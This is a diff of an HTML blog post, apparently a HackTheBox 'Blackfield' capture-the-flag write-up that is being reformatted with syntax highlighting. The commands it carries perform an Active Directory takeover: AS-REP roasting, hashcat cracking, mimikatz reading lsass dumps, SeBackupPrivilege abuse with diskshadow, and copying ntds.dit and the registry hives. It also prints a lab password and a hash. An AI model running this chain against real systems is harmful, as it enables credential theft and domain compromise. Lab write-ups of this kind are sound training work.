@@ -57,7 +57,7 @@ Part 1: Initial Enumeration"/>
   },
   "genre": "posts",
   "keywords": "Windows, AD, HackTheBox, Active Directory",
-  "wordcount":  1045 ,
+  "wordcount":  1043 ,
   "url": "https:\/\/eriqueangwenyi.github.io\/2020\/blackfield\/",
   "datePublished": "2020-10-05T00:00:00\u002b00:00",
   "dateModified": "2020-10-05T00:00:00\u002b00:00",
@@ -183,13 +183,11 @@ The following were the key take aways;</p>
 Several interesting ports are available for further enumeration as observed from the result
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black2.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p>(ii) Smb Enumeration on port 445</p>
-<pre><code>smbclient -L //10.10.10.192 -N
-</code></pre>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black3.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">smbclient <span style="color:#f92672">-</span>L <span style="color:#e6db74">//</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">192</span> <span style="color:#f92672">-</span>N
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black3.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 The following shares were available, however, only <strong>profiles$</strong> share was accessible</p>
-<pre><code> smbclient //10.10.10.192/profiles$ -N
-</code></pre>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black4.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">   smbclient <span style="color:#e6db74">//</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">192</span><span style="color:#f92672">/</span>profiles<span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#f92672">-</span>N
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black4.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 Some Interesting folders found were discovered here, and they seemed to be named after user accounts
 The next step was copying these names in a text file, then checking the content of the folders using <strong>“recurse”</strong> command.
 Following after with <strong>&ldquo;dir&rdquo;</strong> (to show directories of each user) but all directories were empty
@@ -199,14 +197,12 @@ Another question is, why would this flag be set for an account if it will expose
 For further reading on kerberos preauth, click on the link below
 <a href="http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm#UF_DONT_REQUIRE_PREAUTH">http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm#UF_DONT_REQUIRE_PREAUTH</a>
 So moving on to using the badboy script(getnpusers.py), A tgt ticket was found for user support account</p>
-<pre><code> python3 GetNPUsers.py BLACKFIELD.local/ -usersfile /home/osboxes/boxes/blackfield/user.txt -dc-ip 10.10.10.192
-</code></pre>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black6.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">   python3 <span style="color:#66d9ef">GetNPUsers</span><span style="color:#f92672">.</span>py <span style="color:#66d9ef">BLACKFIELD</span><span style="color:#f92672">.</span>local<span style="color:#f92672">/</span> <span style="color:#f92672">-</span>usersfile <span style="color:#e6db74">/home/os</span>boxes<span style="color:#f92672">/</span>boxes<span style="color:#f92672">/</span>blackfield<span style="color:#f92672">/</span>user<span style="color:#f92672">.</span>txt <span style="color:#f92672">-</span>dc<span style="color:#f92672">-</span>ip <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">192</span>
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black6.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black7.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 After getting the hash above, <strong>hash cat</strong> was used to crack it using the command below</p>
-<pre><code> hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
-</code></pre>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black8.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">     hashcat <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0</span> <span style="color:#f92672">-</span>m <span style="color:#ae81ff">18200</span> hash<span style="color:#f92672">.</span>txt <span style="color:#e6db74">/usr/s</span>hare<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>rockyou<span style="color:#f92672">.</span>txt
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black8.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 <strong>user:support</strong>
 <strong>password:#00^BlackKnight</strong>  <br>
 So using the credentials above, <strong>rdp</strong> to the machine was attempted but it was not possible maybe because the account was not a member of the <strong>remote access group</strong>.<br>
@@ -229,13 +225,11 @@ Switched to a windows vm ,extracted the zip file then downloaded the mimikatz ex
 Running mimikatz opens this terminal on cmd.</p>
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black14.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 The following command was run</p>
-<pre><code>sekurlsa::minidump lsass.dmp
-</code></pre>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black15.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
-then &hellip;</p>
-<pre><code>'sekurlsa::logonPasswords full'
-</code></pre>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black16.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">  sekurlsa<span style="color:#f92672">::</span>minidump lsass<span style="color:#f92672">.</span>dmp
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black15.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+then</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">   <span style="color:#e6db74">&#39;sekurlsa::logonPasswords full&#39;</span>
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black16.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 and svc_backup account <strong>hash(9658d1d1dcd9250115e2205d9f48400d)</strong> was found,
 then using evilwinrm, logged in using the above credentials and Voila!we have the user flag.</p>
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black17.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure> <br>
@@ -255,33 +249,29 @@ All tools needed were uploaded  <br>
 On running winpeas.exe, the executable disappered. This wasn&rsquo;t so clear why at this point.<br>
 <strong>&ndash;&gt;SharpHound</strong><br>
 On this second tool, the following commands were ran</p>
-<pre><code>Powershell -exec bypass
- Import-module SharpHound.ps1
-</code></pre>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black21.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"> <span style="color:#66d9ef">Powershell</span> <span style="color:#f92672">-</span>exec bypass
+  <span style="color:#66d9ef">Import</span><span style="color:#f92672">-</span><span style="color:#66d9ef">module</span> SharpHound<span style="color:#f92672">.</span>ps1
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black21.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 as you can see in the above image, sharphound was blocked by the antivirus , this explains the sudden disappearnace of the winpeas.exe as well.<br>
 <strong>&ndash;&gt;Powerup</strong><br>
 On this third tool, the following commands were ran</p>
-<pre><code> Import-Module ./powerup.ps1
- Invoke-AllChecks
-</code></pre>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black22.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">     <span style="color:#66d9ef">Import</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Module</span> <span style="color:#f92672">.</span>/powerup<span style="color:#f92672">.</span>ps1
+     <span style="color:#66d9ef">Invoke</span><span style="color:#f92672">-</span><span style="color:#66d9ef">AllChecks</span>
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black22.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 As you can see above, the user can backup and restore things.
 After an online search on attack vectors on these, it led me to the following links;<br>
 <a href="https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf">https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf</a><br>
 <a href="https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm">https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm</a><br>
 From the two links above, came up with the following script</p>
-<pre><code>set context persistent nowriters#
-add volume c: alias new1#
-create#
-expose %new1% z:#
-
-</code></pre><p>The script was then uploaded  to the server
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">set context persistent nowriters<span style="color:#75715e">#</span>
+add volume <span style="color:#e6db74">c</span>: <span style="color:#66d9ef">alias</span> new1<span style="color:#75715e">#</span>
+create<span style="color:#75715e">#</span>
+expose <span style="color:#f92672">%</span>new1<span style="color:#f92672">%</span> <span style="color:#e6db74">z</span>:<span style="color:#75715e">#</span>
+</code></pre></div><p>The script was then uploaded  to the server
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black23.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p>Then the script was ran using the command below.</p>
-<pre><code>cmd /c diskshadow /s script.txt
-</code></pre>
-<p>The shadow copy was successfully created and exposed as partition ‘Z’
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">    cmd <span style="color:#e6db74">/c diskshadow /s</span> script<span style="color:#f92672">.</span>txt
+</code></pre></div><p>The shadow copy was successfully created and exposed as partition ‘Z’
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black24.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black25.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 The next thing was to find ntds and copy it to <em>tmp folder</em>. <strong>Why is ntds file important?</strong> The Ntds. dit  file is a database that stores Active Directory data, including  information about user objects, groups, and group membership. It  includes the password hashes for all users in the domain.<br>
@@ -293,15 +283,12 @@ then importing them</p>
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black26.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 The reason why we used these two dlls was based on the constant that, <strong>if you want to read/copy data out of a &ldquo;normally forbidden&rdquo; folder, you have to act as a backup software</strong>.
 Using the function below, we simulated a backup software,,however you are required to have the privileges to perform that task</p>
-<pre><code>Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit c:\tmp\ntds.dit 
-
-![](/images/black27.png)
-</code></pre>
-<p>After the above was successfully executed, ran the following commands  from the tmp folder, which extracted the <strong>system.hive</strong> and <strong>sam.hive</strong> files from the backed up ntds.dit files</p>
-<pre><code>reg save HKLM\SYSTEM c:\tmp\system.hive
-reg save HKLM\SAM c:\tmp\sam.hive
-</code></pre>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black28.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"> <span style="color:#66d9ef">Copy</span><span style="color:#f92672">-</span><span style="color:#66d9ef">FileSeBackupPrivilege</span> <span style="color:#e6db74">z</span>:\windows\ntds\ntds<span style="color:#f92672">.</span>dit <span style="color:#e6db74">c</span>:\tmp\ntds<span style="color:#f92672">.</span>dit 
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black27.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+After the above was successfully executed, ran the following commands  from the tmp folder, which extracted the <strong>system.hive</strong> and <strong>sam.hive</strong> files from the backed up ntds.dit files</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"> reg save <span style="color:#66d9ef">HKLM</span>\<span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">c</span>:\tmp\system<span style="color:#f92672">.</span>hive
+ reg save <span style="color:#66d9ef">HKLM</span>\<span style="color:#66d9ef">SAM</span> <span style="color:#e6db74">c</span>:\tmp\sam<span style="color:#f92672">.</span>hive
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black28.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black29.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p>These files were then downloaded
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/black30.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
@@ -326,7 +313,7 @@ and finally the <strong>root flag!</strong> Hurrraaay!!
            
             <p class="copyright-item">
                     <span>Words:</span>
-                   <span>1045</span>
+                   <span>1043</span>
             </p>
             
             <p class="copyright-item">
